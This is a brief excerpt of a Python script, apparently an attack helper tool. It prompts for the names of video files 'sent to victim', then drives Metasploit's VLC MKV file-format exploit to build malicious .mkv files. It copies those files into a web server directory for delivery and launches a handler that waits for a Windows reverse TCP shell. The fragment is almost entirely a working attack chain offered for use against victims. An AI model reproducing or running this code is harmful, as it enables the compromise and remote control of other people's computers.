...
mkvn1=input(f"\n{color.ORANGE} Enter : The name OF Vidio(1) You sent To victim:")
...
os.system(
          f"sudo xterm -hold -fa monaco -fs 7 -bg black -e msfconsole -x  'use exploit/windows/fileformat/vlc_mkv ; set LHOST {ip} ; set LPORT {lport} ; set MKV_ONE {mkvn1} ; set MKV_TWO {mkvn2} ; exploit ; sudo mv /root/.msf4/local/{mkvn1}.mkv /var/www/html ; sudo mv /root/.msf4/local/{mkvn2}.mkv /var/www/html  ; use exploit/multi/handler ; set payload windows/x64/shell/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit '"
                 )
